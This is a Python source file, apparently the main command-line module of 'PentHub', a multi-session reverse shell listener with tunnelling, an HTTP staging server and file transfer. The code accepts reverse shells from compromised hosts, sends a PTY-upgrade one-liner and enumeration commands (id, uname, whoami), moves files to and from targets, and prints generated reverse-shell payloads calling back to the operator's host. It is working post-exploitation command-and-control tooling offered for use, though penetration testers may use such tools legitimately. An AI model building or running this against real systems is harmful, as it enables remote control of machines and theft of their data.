from __future__ import annotations

import argparse
import select
import shlex
import sys
import time

from penthub import __version__
from penthub.listener import Session, SessionManager
from penthub.payloads import generate_payloads
from penthub.staging import StagingServer
from penthub.transfer import download_file, upload_file
from penthub.tunnel import TunnelManager


def _print_session_help() -> None:
    print(
        "\nSession Commands:\n"
        "  :upload <local> <remote>   Upload file with Base64 + SHA-256 verification\n"
        "  :download <remote> <local> Download file via framed Base64 stream\n"
        "  :pty                       Send Python/script PTY upgrade one-liner\n"
        "  :check                     Run quick host enumeration (id, uname/ver, network)\n"
        "  :info                      Show session metadata\n"
        "  :rename <alias>            Set friendly session alias\n"
        "  :kill                      Close this session\n"
        "  :back                      Return to main menu\n"
    )


def interact_session(manager: SessionManager, sid: int) -> None:
    session = manager.get(sid)
    if not session:
        print(f"[!] Session #{sid} not found or closed.")
        return

    sock = session.conn
    print("=" * 64)
    print(f"[*] Interactive {session.label}")
    print("[*] Type :help for commands | :back to return")
    print("=" * 64)

    while session.alive:
        try:
            readable, _, _ = select.select([sock, sys.stdin], [], [], 0.2)
        except KeyboardInterrupt:
            print("\n[*] Returning to menu...")
            return
        except (OSError, ValueError):
            break

        if sock in readable:
            with session.io_lock:
                try:
                    data = sock.recv(4096)
                except OSError:
                    data = b""
            if not data:
                print(f"\n[!] Session #{sid} disconnected.")
                manager.kill(sid)
                return
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

        if sys.stdin in readable:
            line = sys.stdin.readline()
            if not line:
                return
            cmd = line.rstrip("\r\n")
            if cmd == ":back":
                return
            if cmd == ":help":
                _print_session_help()
                continue
            if cmd == ":info":
                print(f"\n[*] {session.label} | connected_at={time.strftime('%H:%M:%S', time.localtime(session.connected_at))}")
                continue
            if cmd == ":kill":
                manager.kill(sid)
                print(f"[*] Session #{sid} closed.")
                return
            if cmd.startswith(":rename "):
                alias = cmd[len(":rename ") :].strip()
                if manager.rename(sid, alias):
                    print(f"[+] Session #{sid} renamed to '{alias}'")
                continue
            if cmd == ":pty":
                if session.os == "windows":
                    print("[!] :pty is only applicable to POSIX targets.")
                else:
                    pty_cmd = (
                        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                        "script -qc /bin/bash /dev/null 2>/dev/null; export TERM=xterm-256color\n"
                    )
                    with session.io_lock:
                        sock.sendall(pty_cmd.encode())
                continue
            if cmd == ":check":
                chk = "whoami & hostname & ipconfig\n" if session.os == "windows" else "id; uname -a; ip -brief a 2>/dev/null || ifconfig\n"
                with session.io_lock:
                    sock.sendall(chk.encode())
                continue
            if cmd.startswith(":upload"):
                try:
                    parts = shlex.split(cmd)
                except ValueError as exc:
                    print(f"[!] Invalid syntax: {exc}")
                    continue
                if len(parts) < 3:
                    print("[!] Usage: :upload <local_path> <remote_path>")
                    continue
                ok, msg = upload_file(
                    session,
                    parts[1],
                    parts[2],
                    on_progress=lambda i, t: sys.stdout.write(f"\r[*] Uploading chunk {i}/{t}") or sys.stdout.flush(),
                )
                print(f"\n{'[+]' if ok else '[!]'} {msg}")
                continue
            if cmd.startswith(":download"):
                try:
                    parts = shlex.split(cmd)
                except ValueError as exc:
                    print(f"[!] Invalid syntax: {exc}")
                    continue
                if len(parts) < 3:
                    print("[!] Usage: :download <remote_path> <local_path>")
                    continue
                ok, msg = download_file(
                    session,
                    parts[1],
                    parts[2],
                    on_bytes=lambda n: sys.stdout.write(f"\r[*] Received {n} bytes...") or sys.stdout.flush(),
                )
                print(f"\n{'[+]' if ok else '[!]'} {msg}")
                continue

            try:
                sock.sendall((cmd + "\n").encode())
            except OSError:
                print(f"\n[!] Failed to send to session #{sid}.")
                manager.kill(sid)
                return


def show_payloads(tunnel: TunnelManager, http_url: str | None) -> None:
    if not tunnel.host or not tunnel.port:
        print(f"[!] Endpoint not ready yet. {tunnel.error or ''}")
        return
    print(f"\n=== PAYLOADS ({tunnel.host}:{tunnel.port}) ===")
    for name, cmd in generate_payloads(tunnel.host, tunnel.port, http_url=http_url).items():
        print(f"\n[{name}]\n{cmd}")
    print("")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="penthub",
        description="PentHub - Multi-session reverse shell listener, tunnel manager, and SHA-256 verified file transfer hub.",
    )
    parser.add_argument("-p", "--port", type=int, default=8888, help="Local listener TCP port (default: 8888)")
    parser.add_argument("-b", "--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    parser.add_argument("-m", "--mode", choices=["local", "pinggy"], default="local", help="Endpoint mode: local/VPN IP or Pinggy SSH tunnel")
    parser.add_argument("-i", "--iface", default=None, help="Preferred interface in local mode (e.g. tun0, eth0)")
    parser.add_argument("--host", default=None, help="Explicit callback host/IP override in local mode")
    parser.add_argument("--http-port", type=int, default=0, help="Enable HTTP staging server on this port (0 = disabled)")
    parser.add_argument("--srv-dir", default="./srv", help="Directory served by optional HTTP staging server")
    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    tunnel = TunnelManager(local_port=args.port, mode=args.mode, iface=args.iface, host_override=args.host)
    tunnel.start(wait_seconds=5.0 if args.mode == "pinggy" else 0.0)

    def _notify(session: Session) -> None:
        sys.stdout.write(f"\n\n[+] Session connected: {session.label}\n> ")
        sys.stdout.flush()

    manager = SessionManager(bind_host=args.bind, port=args.port, on_connect=_notify)
    try:
        manager.start()
    except OSError as exc:
        print(f"[!] Failed to bind {args.bind}:{args.port}: {exc}")
        tunnel.stop()
        return 1

    staging: StagingServer | None = None
    http_url: str | None = None
    if args.http_port > 0:
        staging = StagingServer(directory=args.srv_dir, bind_host=args.bind, port=args.http_port)
        actual_http = staging.start()
        if tunnel.host:
            http_url = f"http://{tunnel.host}:{actual_http}"

    try:
        while True:
            ep = tunnel.url or (f"FAILED ({tunnel.error})" if tunnel.error else "WAITING...")
            active = manager.list_sessions()
            print(f"\n--- PENTHUB v{__version__} ({args.mode.upper()}) ---")
            print(f"[Listener]: {args.bind}:{manager.actual_port} | [Endpoint]: {ep} | [Sessions]: {len(active)}")
            if http_url:
                print(f"[HTTP Staging]: {http_url} -> {args.srv_dir}")
            print("1. Payloads\n2. Sessions\n3. Exit")
            try:
                choice = input("\n> ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if choice == "1":
                show_payloads(tunnel, http_url)
            elif choice == "2":
                if not active:
                    print("[*] No active sessions.")
                    continue
                for sess in active:
                    print(f"  {sess.label}")
                try:
                    sid = int(input("Session ID: ").strip())
                except (ValueError, EOFError, KeyboardInterrupt):
                    continue
                interact_session(manager, sid)
            elif choice == "3":
                break
    finally:
        manager.stop()
        tunnel.stop()
        if staging:
            staging.stop()
    return 0
